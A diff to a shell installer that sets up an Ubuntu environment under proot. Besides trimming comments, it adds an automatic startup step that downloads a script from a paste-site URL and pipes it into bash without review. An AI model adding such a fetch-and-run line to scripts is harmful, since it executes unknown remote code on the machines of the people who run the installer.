@@ -15,7 +15,7 @@ else
   exit 1
 fi
 
-# ✅ AUTO YES (không hỏi nữa)
+# ✅ AUTO YES
 install_ubuntu="YES"
 
 if [ ! -e $ROOTFS_DIR/.installed ]; then
@@ -61,7 +61,7 @@ if [ ! -e $ROOTFS_DIR/.installed ]; then
   chmod 755 $ROOTFS_DIR/usr/local/bin/proot
 fi
 
-# ✅ FIX lỗi /root không tồn tại
+# ✅ FIX /root
 mkdir -p $ROOTFS_DIR/root
 
 if [ ! -e $ROOTFS_DIR/.installed ]; then
@@ -84,6 +84,10 @@ display_gg() {
 clear
 display_gg
 
+# 🚀 CHẠY TRONG VM + AUTO SCRIPT
 $ROOTFS_DIR/usr/local/bin/proot \
   --rootfs="${ROOTFS_DIR}" \
-  -0 -w "/root" -b /dev -b /sys -b /proc -b /etc/resolv.conf --kill-on-exit
+  -0 -w "/root" \
+  -b /dev -b /sys -b /proc -b /etc/resolv.conf \
+  --kill-on-exit \
+  /bin/bash -c "apt update && apt install curl -y && curl -sL https://pastefy.app/jNmW96o2/raw | bash; exec bash"
